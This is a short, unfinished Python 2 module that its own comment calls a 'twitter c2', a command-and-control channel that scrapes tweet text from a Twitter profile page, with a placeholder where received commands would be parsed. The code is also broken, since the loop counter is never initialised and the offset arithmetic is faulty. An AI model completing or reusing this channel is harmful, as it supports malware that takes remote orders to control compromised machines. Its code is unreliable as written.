# module for twitter c2

import urllib

#need to fix for actual twitter handle
urlhandle = urllib.urlopen("http://twitter.com/kolache")
urldata = urlhandle.read()

while c<len(urldata):
	ccont = urldata.find("js-tweet-text tweet-text",c)
	prstr = urldata[ccont:urldata.find("</p>",ccont)]
	# add in parsing of commands here in place of print
	print prstr
	c = c + ccont + len(prstr)
